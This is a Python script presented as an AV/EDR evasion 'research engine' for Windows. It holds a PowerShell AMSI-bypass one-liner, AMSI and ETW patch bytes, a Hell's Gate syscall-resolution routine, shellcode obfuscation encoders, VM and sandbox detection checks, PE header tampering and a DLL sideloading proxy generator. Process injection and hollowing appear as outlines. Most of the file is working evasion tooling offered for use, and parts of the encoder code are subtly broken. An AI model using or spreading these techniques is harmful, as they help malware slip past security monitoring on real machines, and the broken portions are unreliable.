#!/usr/bin/env python3
"""
Anti-Virus / EDR Evasion Research Engine.
Techniques: PE manipulation, anti-sandbox, syscall evasion,
process injection, shellcode encoding, DLL sideloading.
Zero external deps. Research/lab use.
"""
from __future__ import annotations
import base64 as _b64, ctypes as _ct, hashlib as _hl, json as _js
import os as _os, random as _rd, re as _re, struct as _st, sys as _sys, time as _tm
from dataclasses import dataclass, field
from typing import Any, Optional

# ===== PE Manipulation =====

class PEManipulator:
    BENIGN_SECTIONS = [b".text",b".rdata",b".data",b".rsrc",b".reloc",b".pdata"]
    SUSPICIOUS_SECTIONS = [b".vmp0",b".vmp1",b".upx0",b".upx1",b".aspack",
                           b".pec2",b".MPRESS",b".themida",b".enigma",b".sforce"]

    @staticmethod
    def stomp_timestamp(data):
        pe_off = _st.unpack_from("<I", data, 0x3C)[0]
        ts_off = pe_off + 8
        if ts_off + 4 <= len(data):
            data[ts_off:ts_off+4] = bytes(4)
        return data

    @staticmethod
    def rename_sections(data):
        pe_off = _st.unpack_from("<I", data, 0x3C)[0]
        ns = _st.unpack_from("<H", data, pe_off + 6)[0]
        ohs = _st.unpack_from("<H", data, pe_off + 20)[0]
        ss = pe_off + 24 + ohs
        for i in range(ns):
            off = ss + i * 40
            nm = data[off:off+8].rstrip(b"\x00")
            for sus in PEManipulator.SUSPICIOUS_SECTIONS:
                if sus in nm:
                    nw = b"." + _hl.md5(nm).digest()[:5].hex().encode()[:7]
                    data[off:off+8] = nw.ljust(8, b"\x00")[:8]
        return data

    @staticmethod
    def inflate_overlay(data, size_kb=512):
        return data + _os.urandom(size_kb * 1024)

    @staticmethod
    def strip_debug(data):
        pe_off = _st.unpack_from("<I", data, 0x3C)[0]
        try:
            _st.pack_into("<I", data, pe_off + 160, 0)
            _st.pack_into("<I", data, pe_off + 164, 0)
        except Exception:
            pass
        return data

# ===== Anti-Sandbox =====

class AntiSandbox:
    VM_PROCS = ["VBoxService.exe","VBoxTray.exe","vmwaretray.exe","vmtoolsd.exe",
                "qemu-ga.exe","SbieSvc.exe"]

    @staticmethod
    def detect_vm():
        return {"vm_procs_to_check": AntiSandbox.VM_PROCS, "mac_prefixes":
                ["00:05:69","00:0C:29","00:1C:42","00:50:56","08:00:27","52:54:00"]}

    @staticmethod
    def sandbox_files():
        return ["C:\\agent\\agent.pyw","C:\\sandbox\\","C:\\cuckoo\\",
                "C:\\analysis\\"]

    @staticmethod
    def generate_sleep_delay(sec=30):
        return "while GetTickCount()-start<{}000: volatile int x=0;for(int i=0;i<100000;i++)x+=i;Sleep(100);".format(sec)

    @staticmethod
    def cpu_cores_check():
        import multiprocessing as _mp
        return {"cores": _mp.cpu_count(), "probable_sandbox": _mp.cpu_count() < 2}

# ===== AMSI/ETW Bypass =====

class AMSIBypass:
    @staticmethod
    def patch_bytes():
        return {"function":"AmsiScanBuffer","arch":"x64",
                "patch_bytes":bytes([0xB8,0x57,0x00,0x07,0x80,0xC3]),
                "asm":"mov eax, E_INVALIDARG; ret"}

    @staticmethod
    def powershell_bypass():
        return "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"

    @staticmethod
    def etw_patch():
        return [{"func":"EtwEventWrite","arch":"x64",
                 "bytes":bytes([0x48,0x33,0xC0,0xC3]),"asm":"xor rax,rax; ret"}]

# ===== Syscall Evasion =====

class SyscallEvasion:
    SYSCALLS = {
        "NtAllocateVirtualMemory": "0x18",
        "NtWriteVirtualMemory": "0x3A",
        "NtProtectVirtualMemory": "0x50",
        "NtCreateThreadEx": "0xC6",
        "NtOpenProcess": "0x26",
        "NtReadVirtualMemory": "0x3F",
        "NtQueueApcThread": "0x45",
        "NtClose": "0x0F",
    }

    @staticmethod
    def stub(name):
        return "mov r10, rcx; mov eax, SSN_{}; syscall; ret".format(name)

    @staticmethod
    def hells_gate_c():
        return """// Hells Gate technique — walk ntdll for syscall stubs
PVOID resolve_syscall(DWORD ssn) {
    PUCHAR base = get_ntdll_base();
    for(DWORD i=0; i<0x1000; i++) {
        if(base[i]==0x0F && base[i+1]==0x05 &&
           base[i-14]==0x4C && base[i-13]==0x8B &&
           base[i-12]==0xD1 && base[i-11]==0xB8 &&
           *(PDWORD)(base+i-10)==ssn)
            return base+i-14;
    }
    return NULL;
}"""

# ===== Shellcode Encoding =====

class ShellcodeEncoder:
    @staticmethod
    def xor(data, key=None):
        k = key or _os.urandom(1)
        return bytes(b ^ k[0] for b in data) if len(k)==1 else bytes(d^k[i%len(k)] for i,d in enumerate(data)), k

    @staticmethod
    def ipv4(data):
        return [".".join(str(b) for b in data[i:i+4].ljust(4,b"\x00"))
                for i in range(0,len(data),4)]

    @staticmethod
    def ipv6(data):
        return [":".join("{:02x}{:02x}".format(data[i+j],data[i+j+1])
                for j in range(0,16,2))
                for i in range(0,len(data),16)]

    @staticmethod
    def uuid(data):
        out = []
        for i in range(0,len(data),16):
            chunk = data[i:i+16]
            if len(chunk)==16:
                uuid_bytes = struct.pack("<IHHI", *struct.unpack(">IHHI", chunk[:12]))+chunk[12:]
                out.append(str(uuid.UUID(bytes_le=uuid_bytes)))
        return out

    try:
        import uuid
    except ImportError:
        uuid = None

    __uuid_have = "uuid" in globals()

    if not __uuid_have:
        @staticmethod
        def uuid(data): return ["no uuid support"]

    @staticmethod
    def full_pipeline(data):
        xored, key = ShellcodeEncoder.xor(data)
        return {"xor_encoded_b64": _b64.b64encode(xored).decode(),
                "key": _b64.b64encode(key).decode(),
                "length": len(data),
                "recommendations": ["Stage1: XOR","Stage2: IP formatting",
                                    "Stage3: RC4","Stage4: UUID format",
                                    "Exec: alloc RW->decrypt->mark RX->execute"]}

# ===== Process Injection =====

class ProcessInjection:
    @staticmethod
    def classic_dll(proc, dll):
        return """// Classic DLL Injection: OpenProcess->VirtualAllocEx->
// WriteProcessMemory->CreateRemoteThread(LoadLibraryA)
// Target: {0}, Payload: {1}""".format(proc, dll)

    @staticmethod
    def reflective():
        return """// Reflective DLL Injection: parse PE in memory,
// resolve IAT & relocations, call DllMain directly.
// Avoids LoadLibrary traces & registry keys."""

    @staticmethod
    def process_hollowing(proc, payload):
        return """// Process Hollowing: CreateProcess({0}, SUSPENDED)->
// NtUnmapViewOfSection->VirtualAllocEx->write {1} headers/sections
// ->SetThreadContext->ResumeThread""".format(proc, payload)

    @staticmethod
    def apc_injection(proc):
        return """// APC Injection: enumerate threads of {0},
// QueueUserAPC with payload address for each thread""".format(proc)

# ===== DLL Sideloading =====

class DLLSideload:
    TARGETS = {
        "version.dll": ["GetFileVersionInfoA","GetFileVersionInfoW","VerQueryValueA"],
        "winmm.dll": ["timeGetTime","PlaySoundA"],
        "dxgi.dll": ["CreateDXGIFactory","CreateDXGIFactory1"],
        "d3d9.dll": ["Direct3DCreate9"],
        "vcruntime140.dll": ["memcpy","memset"],
        "userenv.dll": ["CreateEnvironmentBlock"],
    }

    @staticmethod
    def generate_proxy(dll):
        exps = DLLSideload.TARGETS.get(dll, ["DllEntry"])
        header = "// DLL Proxy: {0}\\n#include <windows.h>\\n".format(dll)
        for i, e in enumerate(exps):
            header += '#pragma comment(linker, "/EXPORT:{0}=original_{1}.{0},@{2}")\\n'.format(e, dll, i+2)
        header += """void entry() { WinExec("calc.exe",SW_SHOW); }
BOOL WINAPI DllMain(HINSTANCE h,DWORD r,LPVOID v) {
    if(r==DLL_PROCESS_ATTACH){DisableThreadLibraryCalls(h);
        CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)entry,NULL,0,NULL);}
    return TRUE;
}"""
        return header

# ===== CLI =====

if __name__ == "__main__":
    import argparse
    prs = argparse.ArgumentParser(description="AV/EDR Evasion Engine")
    sp = prs.add_subparsers(dest="c")
    sp.add_parser("pe",help="PE manipulation techniques")
    sp.add_parser("sandbox",help="Anti-sandbox techniques")
    sp.add_parser("amsi",help="AMSI/ETW bypass")
    sp.add_parser("syscall",help="Syscall evasion")
    sp.add_parser("inject",help="Process injection")
    sp.add_parser("encode",help="Shellcode encoding")
    sp.add_parser("sideload",help="DLL sideloading")
    sp.add_parser("all",help="All techniques summary")
    a = prs.parse_args()

    if a.c == "pe":
        print("PE Manipulation: stomp_timestamp, rename_sections, inflate_overlay, strip_debug")
        print("Use from Python: from attack_evasion import PEManipulator")
    elif a.c == "sandbox":
        print(_js.dumps(AntiSandbox.detect_vm(), indent=2, default=str))
    elif a.c == "amsi":
        print(_js.dumps(AMSIBypass.patch_bytes(), indent=2, default=str))
        print(AMSIBypass.powershell_bypass())
    elif a.c == "syscall":
        print(_js.dumps(SyscallEvasion.SYSCALLS, indent=2))
        print(SyscallEvasion.hells_gate_c())
    elif a.c == "inject":
        print(ProcessInjection.classic_dll("target.exe", "payload.dll"))
        print(ProcessInjection.reflective())
        print(ProcessInjection.process_hollowing("svchost.exe", "payload.exe"))
        print(ProcessInjection.apc_injection("explorer.exe"))
    elif a.c == "encode":
        print(_js.dumps(ShellcodeEncoder.full_pipeline(b"test_payload_data_placeholder_32"), indent=2))
    elif a.c == "sideload":
        for dll in DLLSideload.TARGETS:
            print(DLLSideload.generate_proxy(dll))
    elif a.c == "all" or not a.c:
        print(_js.dumps({
            "pe_manipulation": ["stomp_timestamp","rename_sections","inflate_overlay","strip_debug"],
            "anti_sandbox": AntiSandbox.detect_vm(),
            "amsi_etw_bypass": AMSIBypass.patch_bytes(),
            "syscall_evasion": list(SyscallEvasion.SYSCALLS.keys()),
            "process_injection": ["classic_dll","reflective","process_hollowing","apc_injection"],
            "shellcode_encoding": ["xor","ipv4","ipv6","uuid","full_pipeline"],
            "dll_sideload": list(DLLSideload.TARGETS.keys()),
        }, indent=2, default=str))
